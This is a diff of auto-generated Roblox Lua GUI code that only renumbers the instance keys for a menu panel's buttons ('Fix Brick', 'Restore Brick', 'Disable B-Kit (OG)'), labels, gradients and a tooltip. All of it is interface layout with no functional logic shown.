 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.buttonFade
-G2L["249"] = Instance.new("CanvasGroup", G2L["247"]);
-G2L["249"]["BorderSizePixel"] = 0;
-G2L["249"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["249"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["249"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["249"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["249"]["Name"] = [[buttonFade]];
+G2L["277"] = Instance.new("CanvasGroup", G2L["275"]);
+G2L["277"]["BorderSizePixel"] = 0;
+G2L["277"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["277"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["277"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["277"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["277"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.buttonFrame.buttonFade.UIGradient
-G2L["24a"] = Instance.new("UIGradient", G2L["249"]);
-G2L["24a"]["Rotation"] = 90;
-G2L["24a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["278"] = Instance.new("UIGradient", G2L["277"]);
+G2L["278"]["Rotation"] = 90;
+G2L["278"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.text
-G2L["24b"] = Instance.new("TextLabel", G2L["245"]);
-G2L["24b"]["ZIndex"] = 2;
-G2L["24b"]["BorderSizePixel"] = 0;
-G2L["24b"]["TextSize"] = 14;
-G2L["24b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["24b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["24b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["24b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["24b"]["BackgroundTransparency"] = 1;
-G2L["24b"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["24b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["24b"]["Text"] = [[Fix Brick]];
-G2L["24b"]["Name"] = [[text]];
+G2L["279"] = Instance.new("TextLabel", G2L["273"]);
+G2L["279"]["ZIndex"] = 2;
+G2L["279"]["BorderSizePixel"] = 0;
+G2L["279"]["TextSize"] = 14;
+G2L["279"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["279"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["279"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["279"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["279"]["BackgroundTransparency"] = 1;
+G2L["279"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["279"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["279"]["Text"] = [[Fix Brick]];
+G2L["279"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.button.text.text
-G2L["24c"] = Instance.new("UIStroke", G2L["24b"]);
-G2L["24c"]["Name"] = [[text]];
+G2L["27a"] = Instance.new("UIStroke", G2L["279"]);
+G2L["27a"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.fixbrick.fillbar
-G2L["24d"] = Instance.new("Frame", G2L["244"]);
-G2L["24d"]["ZIndex"] = 90;
-G2L["24d"]["BorderSizePixel"] = 0;
-G2L["24d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["24d"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["24d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["24d"]["Name"] = [[fillbar]];
-G2L["24d"]["BackgroundTransparency"] = 0.95;
+G2L["27b"] = Instance.new("Frame", G2L["272"]);
+G2L["27b"]["ZIndex"] = 90;
+G2L["27b"]["BorderSizePixel"] = 0;
+G2L["27b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27b"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["27b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27b"]["Name"] = [[fillbar]];
+G2L["27b"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick
-G2L["24e"] = Instance.new("Frame", G2L["206"]);
-G2L["24e"]["BorderSizePixel"] = 0;
-G2L["24e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["24e"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["24e"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["24e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["24e"]["Name"] = [[restorebrick]];
-G2L["24e"]["LayoutOrder"] = 4;
-G2L["24e"]["BackgroundTransparency"] = 1;
+G2L["27c"] = Instance.new("Frame", G2L["234"]);
+G2L["27c"]["BorderSizePixel"] = 0;
+G2L["27c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27c"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["27c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["27c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27c"]["Name"] = [[restorebrick]];
+G2L["27c"]["LayoutOrder"] = 4;
+G2L["27c"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button
-G2L["24f"] = Instance.new("TextButton", G2L["24e"]);
-G2L["24f"]["BorderSizePixel"] = 0;
-G2L["24f"]["TextTransparency"] = 1;
-G2L["24f"]["TextSize"] = 14;
-G2L["24f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["24f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["24f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["24f"]["ZIndex"] = 49;
-G2L["24f"]["BackgroundTransparency"] = 1;
-G2L["24f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["24f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["24f"]["Name"] = [[button]];
+G2L["27d"] = Instance.new("TextButton", G2L["27c"]);
+G2L["27d"]["BorderSizePixel"] = 0;
+G2L["27d"]["TextTransparency"] = 1;
+G2L["27d"]["TextSize"] = 14;
+G2L["27d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["27d"]["ZIndex"] = 49;
+G2L["27d"]["BackgroundTransparency"] = 1;
+G2L["27d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["27d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27d"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.UIPadding
-G2L["250"] = Instance.new("UIPadding", G2L["24f"]);
-G2L["250"]["PaddingTop"] = UDim.new(0, 2);
-G2L["250"]["PaddingRight"] = UDim.new(0, 3);
-G2L["250"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["250"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["27e"] = Instance.new("UIPadding", G2L["27d"]);
+G2L["27e"]["PaddingTop"] = UDim.new(0, 2);
+G2L["27e"]["PaddingRight"] = UDim.new(0, 3);
+G2L["27e"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["27e"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame
-G2L["251"] = Instance.new("Frame", G2L["24f"]);
-G2L["251"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["251"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["251"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["251"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["251"]["Name"] = [[buttonFrame]];
+G2L["27f"] = Instance.new("Frame", G2L["27d"]);
+G2L["27f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["27f"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["27f"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["27f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["27f"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.outlineStroke
-G2L["252"] = Instance.new("UIStroke", G2L["251"]);
-G2L["252"]["Thickness"] = 2;
-G2L["252"]["Name"] = [[outlineStroke]];
+G2L["280"] = Instance.new("UIStroke", G2L["27f"]);
+G2L["280"]["Thickness"] = 2;
+G2L["280"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.buttonFade
-G2L["253"] = Instance.new("CanvasGroup", G2L["251"]);
-G2L["253"]["BorderSizePixel"] = 0;
-G2L["253"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["253"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["253"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["253"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["253"]["Name"] = [[buttonFade]];
+G2L["281"] = Instance.new("CanvasGroup", G2L["27f"]);
+G2L["281"]["BorderSizePixel"] = 0;
+G2L["281"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["281"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["281"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["281"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["281"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.buttonFrame.buttonFade.UIGradient
-G2L["254"] = Instance.new("UIGradient", G2L["253"]);
-G2L["254"]["Rotation"] = 90;
-G2L["254"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["282"] = Instance.new("UIGradient", G2L["281"]);
+G2L["282"]["Rotation"] = 90;
+G2L["282"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.text
-G2L["255"] = Instance.new("TextLabel", G2L["24f"]);
-G2L["255"]["ZIndex"] = 2;
-G2L["255"]["BorderSizePixel"] = 0;
-G2L["255"]["TextSize"] = 14;
-G2L["255"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["255"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["255"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["255"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["255"]["BackgroundTransparency"] = 1;
-G2L["255"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["255"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["255"]["Text"] = [[Restore Brick]];
-G2L["255"]["Name"] = [[text]];
+G2L["283"] = Instance.new("TextLabel", G2L["27d"]);
+G2L["283"]["ZIndex"] = 2;
+G2L["283"]["BorderSizePixel"] = 0;
+G2L["283"]["TextSize"] = 14;
+G2L["283"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["283"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["283"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["283"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["283"]["BackgroundTransparency"] = 1;
+G2L["283"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["283"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["283"]["Text"] = [[Restore Brick]];
+G2L["283"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.button.text.text
-G2L["256"] = Instance.new("UIStroke", G2L["255"]);
-G2L["256"]["Name"] = [[text]];
+G2L["284"] = Instance.new("UIStroke", G2L["283"]);
+G2L["284"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.restorebrick.fillbar
-G2L["257"] = Instance.new("Frame", G2L["24e"]);
-G2L["257"]["ZIndex"] = 90;
-G2L["257"]["BorderSizePixel"] = 0;
-G2L["257"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["257"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["257"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["257"]["Name"] = [[fillbar]];
-G2L["257"]["BackgroundTransparency"] = 0.95;
+G2L["285"] = Instance.new("Frame", G2L["27c"]);
+G2L["285"]["ZIndex"] = 90;
+G2L["285"]["BorderSizePixel"] = 0;
+G2L["285"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["285"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["285"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["285"]["Name"] = [[fillbar]];
+G2L["285"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog
-G2L["258"] = Instance.new("Frame", G2L["206"]);
-G2L["258"]["BorderSizePixel"] = 0;
-G2L["258"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["258"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["258"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["258"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["258"]["Name"] = [[disablebkitog]];
-G2L["258"]["LayoutOrder"] = 4;
-G2L["258"]["BackgroundTransparency"] = 1;
+G2L["286"] = Instance.new("Frame", G2L["234"]);
+G2L["286"]["BorderSizePixel"] = 0;
+G2L["286"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["286"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["286"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["286"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["286"]["Name"] = [[disablebkitog]];
+G2L["286"]["LayoutOrder"] = 4;
+G2L["286"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button
-G2L["259"] = Instance.new("TextButton", G2L["258"]);
-G2L["259"]["BorderSizePixel"] = 0;
-G2L["259"]["TextTransparency"] = 1;
-G2L["259"]["TextSize"] = 14;
-G2L["259"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["259"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["259"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["259"]["ZIndex"] = 49;
-G2L["259"]["BackgroundTransparency"] = 1;
-G2L["259"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["259"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["259"]["Name"] = [[button]];
+G2L["287"] = Instance.new("TextButton", G2L["286"]);
+G2L["287"]["BorderSizePixel"] = 0;
+G2L["287"]["TextTransparency"] = 1;
+G2L["287"]["TextSize"] = 14;
+G2L["287"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["287"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["287"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["287"]["ZIndex"] = 49;
+G2L["287"]["BackgroundTransparency"] = 1;
+G2L["287"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["287"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["287"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.UIPadding
-G2L["25a"] = Instance.new("UIPadding", G2L["259"]);
-G2L["25a"]["PaddingTop"] = UDim.new(0, 2);
-G2L["25a"]["PaddingRight"] = UDim.new(0, 3);
-G2L["25a"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["25a"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["288"] = Instance.new("UIPadding", G2L["287"]);
+G2L["288"]["PaddingTop"] = UDim.new(0, 2);
+G2L["288"]["PaddingRight"] = UDim.new(0, 3);
+G2L["288"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["288"]["PaddingBottom"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame
-G2L["25b"] = Instance.new("Frame", G2L["259"]);
-G2L["25b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["25b"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["25b"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["25b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["25b"]["Name"] = [[buttonFrame]];
+G2L["289"] = Instance.new("Frame", G2L["287"]);
+G2L["289"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["289"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["289"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["289"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["289"]["Name"] = [[buttonFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.outlineStroke
-G2L["25c"] = Instance.new("UIStroke", G2L["25b"]);
-G2L["25c"]["Thickness"] = 2;
-G2L["25c"]["Name"] = [[outlineStroke]];
+G2L["28a"] = Instance.new("UIStroke", G2L["289"]);
+G2L["28a"]["Thickness"] = 2;
+G2L["28a"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.buttonFade
-G2L["25d"] = Instance.new("CanvasGroup", G2L["25b"]);
-G2L["25d"]["BorderSizePixel"] = 0;
-G2L["25d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["25d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["25d"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["25d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["25d"]["Name"] = [[buttonFade]];
+G2L["28b"] = Instance.new("CanvasGroup", G2L["289"]);
+G2L["28b"]["BorderSizePixel"] = 0;
+G2L["28b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28b"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["28b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28b"]["Name"] = [[buttonFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.buttonFrame.buttonFade.UIGradient
-G2L["25e"] = Instance.new("UIGradient", G2L["25d"]);
-G2L["25e"]["Rotation"] = 90;
-G2L["25e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["28c"] = Instance.new("UIGradient", G2L["28b"]);
+G2L["28c"]["Rotation"] = 90;
+G2L["28c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.text
-G2L["25f"] = Instance.new("TextLabel", G2L["259"]);
-G2L["25f"]["ZIndex"] = 2;
-G2L["25f"]["BorderSizePixel"] = 0;
-G2L["25f"]["TextSize"] = 14;
-G2L["25f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["25f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["25f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["25f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["25f"]["BackgroundTransparency"] = 1;
-G2L["25f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["25f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["25f"]["Text"] = [[Disable B-Kit (OG)]];
-G2L["25f"]["Name"] = [[text]];
+G2L["28d"] = Instance.new("TextLabel", G2L["287"]);
+G2L["28d"]["ZIndex"] = 2;
+G2L["28d"]["BorderSizePixel"] = 0;
+G2L["28d"]["TextSize"] = 14;
+G2L["28d"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["28d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28d"]["BackgroundTransparency"] = 1;
+G2L["28d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["28d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28d"]["Text"] = [[Disable B-Kit (OG)]];
+G2L["28d"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.button.text.text
-G2L["260"] = Instance.new("UIStroke", G2L["25f"]);
-G2L["260"]["Name"] = [[text]];
+G2L["28e"] = Instance.new("UIStroke", G2L["28d"]);
+G2L["28e"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disablebkitog.fillbar
-G2L["261"] = Instance.new("Frame", G2L["258"]);
-G2L["261"]["ZIndex"] = 90;
-G2L["261"]["BorderSizePixel"] = 0;
-G2L["261"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["261"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["261"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["261"]["Name"] = [[fillbar]];
-G2L["261"]["BackgroundTransparency"] = 0.95;
+G2L["28f"] = Instance.new("Frame", G2L["286"]);
+G2L["28f"]["ZIndex"] = 90;
+G2L["28f"]["BorderSizePixel"] = 0;
+G2L["28f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28f"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["28f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28f"]["Name"] = [[fillbar]];
+G2L["28f"]["BackgroundTransparency"] = 0.95;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.UIListLayout
-G2L["262"] = Instance.new("UIListLayout", G2L["205"]);
-G2L["262"]["Padding"] = UDim.new(0, 5);
-G2L["262"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["290"] = Instance.new("UIListLayout", G2L["233"]);
+G2L["290"]["Padding"] = UDim.new(0, 5);
+G2L["290"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.blackstroke
-G2L["263"] = Instance.new("UIStroke", G2L["f"]);
-G2L["263"]["Thickness"] = 2;
-G2L["263"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["263"]["Name"] = [[blackstroke]];
+G2L["291"] = Instance.new("UIStroke", G2L["f"]);
+G2L["291"]["Thickness"] = 2;
+G2L["291"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["291"]["Name"] = [[blackstroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.UIScale
-G2L["264"] = Instance.new("UIScale", G2L["4"]);
+G2L["292"] = Instance.new("UIScale", G2L["4"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.UIScale
-G2L["265"] = Instance.new("UIScale", G2L["1"]);
+G2L["293"] = Instance.new("UIScale", G2L["1"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.Color
-G2L["266"] = Instance.new("Frame", G2L["1"]);
-G2L["266"]["Visible"] = false;
-G2L["266"]["BorderSizePixel"] = 0;
-G2L["266"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["266"]["Size"] = UDim2.new(0, 100, 0, 100);
-G2L["266"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["266"]["Name"] = [[Color]];
-G2L["266"]["BackgroundTransparency"] = 1;
+G2L["294"] = Instance.new("Frame", G2L["1"]);
+G2L["294"]["Visible"] = false;
+G2L["294"]["BorderSizePixel"] = 0;
+G2L["294"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["294"]["Size"] = UDim2.new(0, 100, 0, 100);
+G2L["294"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["294"]["Name"] = [[Color]];
+G2L["294"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip
-G2L["267"] = Instance.new("Frame", G2L["1"]);
-G2L["267"]["ZIndex"] = 1000000009;
-G2L["267"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["267"]["Size"] = UDim2.new(0, 100, 0, 20);
-G2L["267"]["Position"] = UDim2.new(0.68056, 0, 0.81319, 0);
-G2L["267"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["267"]["Name"] = [[Tooltip]];
+G2L["295"] = Instance.new("Frame", G2L["1"]);
+G2L["295"]["ZIndex"] = 1000000009;
+G2L["295"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["295"]["Size"] = UDim2.new(0, 100, 0, 20);
+G2L["295"]["Position"] = UDim2.new(0.68056, 0, 0.81319, 0);
+G2L["295"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["295"]["Name"] = [[Tooltip]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipScript
-G2L["268"] = Instance.new("LocalScript", G2L["267"]);
-G2L["268"]["Name"] = [[tooltipScript]];
+G2L["296"] = Instance.new("LocalScript", G2L["295"]);
+G2L["296"]["Name"] = [[tooltipScript]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipFade
-G2L["269"] = Instance.new("CanvasGroup", G2L["267"]);
-G2L["269"]["BorderSizePixel"] = 0;
-G2L["269"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["269"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["269"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["269"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["269"]["Name"] = [[tooltipFade]];
+G2L["297"] = Instance.new("CanvasGroup", G2L["295"]);
+G2L["297"]["BorderSizePixel"] = 0;
+G2L["297"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["297"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["297"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["297"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["297"]["Name"] = [[tooltipFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipFade.UIGradient
